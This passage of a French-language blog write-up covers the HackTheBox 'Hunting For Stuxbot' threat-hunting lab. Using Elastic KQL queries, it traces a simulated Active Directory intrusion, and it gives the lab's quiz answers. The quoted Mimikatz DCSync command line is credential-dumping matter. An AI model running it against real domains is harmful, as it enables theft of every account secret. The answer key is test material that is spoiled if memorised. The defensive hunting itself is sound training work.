<p>On récupère le <code>process.pid</code> de ce PowerShell (par ex. 9944) et on filtre toutes ses activités :</p>
<div class="codehilite"><pre><code>process.pid:"9944" AND process.name:"powershell.exe"

</code></pre></div>
<p>On voit :</p>
<ul>
<li>Création de plusieurs fichiers temporaires :
<ul>
<li><code>default.exe</code>,</li>
<li><code>DomainPasswordSpray.ps1</code>, etc. (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</li>
</ul></li>
<li>Résolutions de domaine vers <strong>ngrok.io</strong> (C2 masqué),</li>
<li>Connexions HTTPS aux IPs associées.</li>
</ul>
<p>L’attaquant a donc :</p>
<ol>
<li>Utilisé un batch pour lancer PowerShell.</li>
<li>Téléchargé un <strong>stager</strong> depuis Pastebin.</li>
<li>Déposé un binaire <strong><code>default.exe</code></strong> pour la suite de l’attaque.</li>
<li>Déployé un script de <strong>password spraying</strong>.</li>
</ol>
<h3>Analyse de <code>default.exe</code></h3>
<p>On inspecte tous les événements liés à <code>default.exe</code> :</p>
<div class="codehilite"><pre><code>process.name:"default.exe"

</code></pre></div>
<p>Constats :</p>
<ul>
<li><code>default.exe</code> est en réalité un <strong>ApacheBench</strong> renommé (<code>ab.exe</code>), utilisé ici comme <strong>outil de charge / tunneling C2</strong>. (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</li>
<li>Il crée plusieurs fichiers :
<ul>
<li><code>C:\Users\bob\AppData\Local\Temp\svchost.exe</code></li>
<li><code>C:\Users\Public\SharpHound.exe</code></li>
<li><code>C:\Users\bob\AppData\Local\Temp\PsExec64.exe</code></li>
<li><code>C:\Users\svc-sql1\AppData\Local\Temp\XceGuhkzaTrOy.vbs</code></li>
<li><code>C:\Users\Public\payload.exe</code> (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</li>
</ul></li>
<li>Il génère aussi des connexions régulières vers les IP C2 <code>18.158.249.75</code> puis <code>3.125.102.39</code> (via <strong>ngrok</strong>). (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</li>
</ul>
<blockquote>
<p>Réponse Stuxbot Q1 : le fichier VBS mentionné pendant l’analyse de default.exe est</p>
<p><strong><code>XceGuhkzaTrOy.vbs</code></strong>. (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</p>
</blockquote>
<p>Par ailleurs, le hash SHA-256 de <code>default.exe</code> correspond à l’un de ceux du rapport CTI Stuxbot, et on le retrouve sur <strong>WS001</strong> et <strong>PKI</strong> (serveur de certificats). (<a href="https://faresbltagy.gitbook.io/footprintinglabs/soc-hackthebox-notes-and-labs/introduction-to-threat-hunting-and-hunting-with-elastic-module?utm_source=chatgpt.com">faresbltagy.gitbook.io</a>)</p>
<h3>Recon AD &amp; privilèges</h3>
<ul>
<li>Le fichier <strong><code>SharpHound.exe</code></strong> est déposé dans <code>C:\Users\Public\</code>.</li>
<li>En cherchant son exécution :</li>
</ul>
<div class="codehilite"><pre><code>process.name:"SharpHound.exe"

</code></pre></div>
<p>On voit qu’il a été lancé (deux fois) avec des arguments de collecte (ex. <code>-collectionmethod all</code>). (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</p>
<p>→ L’attaquant réalise un <strong>recon AD</strong> (cartographie des chemins d’escalade).</p>
<h3>Lateral movement &amp; compromission du compte <code>svc-sql1</code></h3>
<p>Recherche globale sur le hash SHA-256 de <code>default.exe</code> :</p>
<div class="codehilite"><pre><code>process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4

</code></pre></div>
<p>On retrouve :</p>
<ul>
<li>Exécution de <code>default.exe</code> sur <strong>WS001</strong> et <strong>PKI</strong>.</li>
<li>Sur <strong>PKI</strong> :
<ul>
<li>Parent process : <strong>PSEXESVC</strong> (PSExec signé Microsoft),</li>
<li><code>user.name</code> : <strong>EAGLE\svc-sql1</strong>. (<a href="https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com">blog.salucci.ch</a>)</li>
</ul></li>
</ul>
<p>On lance alors un hunt sur les logons réseau (type 3) depuis WS001 :</p>
<div class="codehilite"><pre><code>(event.code:4624 OR event.code:4625)
AND winlog.event_data.LogonType:3
AND source.ip:192.168.28.130

</code></pre></div>
<p>On observe : (<a href="https://faresbltagy.gitbook.io/footprintinglabs/soc-hackthebox-notes-and-labs/introduction-to-threat-hunting-and-hunting-with-elastic-module?utm_source=chatgpt.com">faresbltagy.gitbook.io</a>)</p>
<ul>
<li>Quelques échecs pour <code>administrator</code> sur DC1,</li>
<li>Puis, plus tard, <strong>de nombreux logons réussis</strong> pour <code>svc-sql1</code> (sur PKI et d’autres hôtes).</li>
</ul>
<p>Conclusion :</p>
<ul>
<li>Le script <strong>DomainPasswordSpray.ps1</strong> a permis de <strong>bruteforcer le compte <code>svc-sql1</code></strong>,</li>
<li>PSExec est utilisé pour <strong>propager <code>default.exe</code></strong> sur PKI,</li>
<li><code>svc-sql1</code> devient le <strong>pivot principal</strong>.</li>
</ul>
<h3>Mimikatz &amp; dcsync</h3>
<p>On recherche <code>mimikatz.exe</code> :</p>
<div class="codehilite"><pre><code>event.code:1 AND process.name:"mimikatz.exe"

</code></pre></div>
<p>Dans <code>process.args</code>, on trouve : (<a href="https://medium.com/%40devanshichavda98/hackthebox-hunting-for-stuxbot-a-real-world-threat-hunt-with-elastic-ab675a6e764d?utm_source=chatgpt.com">Medium</a>)</p>
<blockquote>
<p>lsadump::dcsync /domain:eagle.local /all /csv, exit</p>
</blockquote>
<p>→ L’attaquant lance un <strong>DCSync</strong> (dump des secrets AD via réplication) → quasiment <strong>full domain compromise</strong>.</p>
<blockquote>
<p>Réponse Stuxbot Q2 : lsadump::dcsync /domain:eagle.local /all /csv, exit</p>
</blockquote>
<h3>Code PowerShell en mémoire → PowerView</h3>
<p>Dernière question : un code PowerShell en mémoire scanne les <strong>partages réseau</strong>. On doit identifier de quel outil il provient.</p>
<p>Stratégie :</p>
<ol>
<li><p>Chercher les événements PowerShell avec contenu de script :</p>
<div class="codehilite"><pre><code>powershell.file.script_block_text: *mimikatz*

</code></pre></div>
<p>(ou plus large : <code>powershell.file.script_block_text:*</code> puis filtrer).</p></li>
<li><p>Lire le script contenu dans <code>powershell.file.script_block_text</code> :</p>
<ul>
<li>On y retrouve des fonctions typiques de <strong>PowerView</strong> (énumération des partages, domaines, ACL, etc.). (<a href="https://medium.com/%40devanshichavda98/hackthebox-hunting-for-stuxbot-a-real-world-threat-hunt-with-elastic-ab675a6e764d?utm_source=chatgpt.com">Medium</a>)</li>
</ul></li>
</ol>
<blockquote>
<p>Réponse Stuxbot Q3 : PowerView</p>
</blockquote>
<h2>Skills Assessment – Hunting For Stuxbot (Round 2)</h2>
<p>Nouvelle itération de Stuxbot, nouvelles TTPs :</p>
<ol>
<li>Dépôt d’outils dans <code>C:\Users\Public</code>.</li>
<li>Persistance via <strong>registry Run keys</strong>.</li>
<li>Lateral movement via <strong>PowerShell Remoting</strong> vers les DC.</li>
</ol>
<h3>Hunt 1 – Lateral Tool Transfer vers <code>C:\Users\Public</code></h3>
<p>Objectif : trouver l’utilisateur lié à un outil copié dans <code>C:\Users\Public</code> dont le nom commence par <strong>“r”</strong>.</p>
<p>Exemple de KQL possible : (<a href="https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com">janprats.com</a>)</p>
<div class="codehilite"><pre><code>event.code:11 AND message:"C:\\Users\\Public*" AND file.name:R*

</code></pre></div>
<p>En filtrant et en examinant l’événement où un outil type <code>Rubeus.exe</code> est transféré, on regarde le champ <strong><code>user.name</code></strong> :</p>
<h3>Hunt 2 – Registry Run Keys / Startup Folder</h3>
<p>Objectif : trouver la <strong>première</strong> persistance par clé de registre (Run key) et donner la valeur de <code>registry.value</code>.</p>
<p>Approche (ID Sysmon 13 pour les modifications de registre) : (<a href="https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com">janprats.com</a>)</p>
<div class="codehilite"><pre><code>event.code:13 AND registry.path:*\\Run\\*

</code></pre></div>
<p>En triant par temps et en regardant la <strong>première</strong> entrée de persistance (créée par <code>powershell.exe</code>), on trouve une valeur “aléatoire” :</p>
<h3>Hunt 3 – PowerShell Remoting vers DC1</h3>
<p>Objectif : identifier l’utilisateur (<code>winlog.user.name</code>) utilisé pour du <strong>PowerShell Remoting</strong> vers <strong>DC1</strong>.</p>
<p>On peut utiliser les logs de Script Block (event 4104) : (<a href="https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com">janprats.com</a>)</p>
<div class="codehilite"><pre><code>event.code:4104 AND message:"DC1"

</code></pre></div>
</div></details></div></article></section>
</main>
<footer class="footer">© 2025 c4tz — dark minimal</footer>
</div>
</div>
<nav aria-label="Navigation mobile" class="mobile-nav">
<a href="../writeup.html"><span>WriteUp</span></a>
<a href="../portfolio.html"><span>Portfolio</span></a>
<a href="../skills.html"><span>Skills</span></a>
<a href="../about.html"><span>About</span></a>
</nav>
<script>
(function(){
  // 2) rewrite image links to static/image/
  document.querySelectorAll('.prose img').forEach(function(img){
    var src = img.getAttribute('src')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(src) || /^image\.png$/.test(src)){
      try{
        img.src = 'static/image/' + decodeURIComponent(src);
      }catch(e){
        img.src = 'static/image/' + src;
      }
    }
  });
  // convert <a href="image X.png"> wrappers too
  document.querySelectorAll('.prose a[href]').forEach(function(a){
    var href = a.getAttribute('href')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(href) || /^image\.png$/.test(href)){
      try{
        a.setAttribute('href','static/image/' + decodeURIComponent(href));
      }catch(e){
        a.setAttribute('href','static/image/' + href);
      }
    }
  });

  // 1) convert pseudo-markdown inside <pre><code> when it's actually prose
  function looksLikeProse(text){
    var codeChars = /[{};<>\[\]\(\);=]/;
    var hasHeadings = /(^|\n)\s*#{2,4}\s+/m.test(text);
    var manyWords = (text.match(/\w+/g)||[]).length > 40;
    var fewCode = !codeChars.test(text);
    // markers 'spl', 'powershell' suggest real code; don't convert
    var isRealCode = /(powershell|spl|cmd\.exe|regex|C:\\|SELECT|curl|http:|https:)/i.test(text);
    return (hasHeadings || manyWords) && fewCode && !isRealCode;
  }

  document.querySelectorAll('.prose pre code').forEach(function(code){
    var text = code.textContent;
    if(looksLikeProse(text)){
      var parentPre = code.closest('pre');
      var container = document.createElement('div');
      container.className = 'converted-prose';
      // basic markdown to HTML
      text.split(/\n{2,}/).forEach(function(block){
        if(/^\s*####\s+/.test(block)){ var el=document.createElement('h4'); el.textContent=block.replace(/^\s*####\s+/, ''); container.appendChild(el); return;}
        if(/^\s*###\s+/.test(block)){ var el=document.createElement('h3'); el.textContent=block.replace(/^\s*###\s+/, ''); container.appendChild(el); return;}
        if(/^\s*##\s+/.test(block)){ var el=document.createElement('h2'); el.textContent=block.replace(/^\s*##\s+/, ''); container.appendChild(el); return;}
        if(/^\s*-\s+|\*\s+/.test(block)){ // list
          var ul=document.createElement('ul');
          block.split(/\n/).forEach(function(line){
            var m=line.match(/^\s*(?:-|\*)\s+(.*)$/); if(m){ var li=document.createElement('li'); li.textContent=m[1]; ul.appendChild(li); }
          });
          container.appendChild(ul); return;
        }
        if(/^\s*---\s*$/.test(block)){ container.appendChild(document.createElement('hr')); return; }
        // paragraph
        var p = document.createElement('p'); p.textContent = block.trim(); container.appendChild(p);
      });
      parentPre.replaceWith(container);
    }
  });
})();</script>
</html>
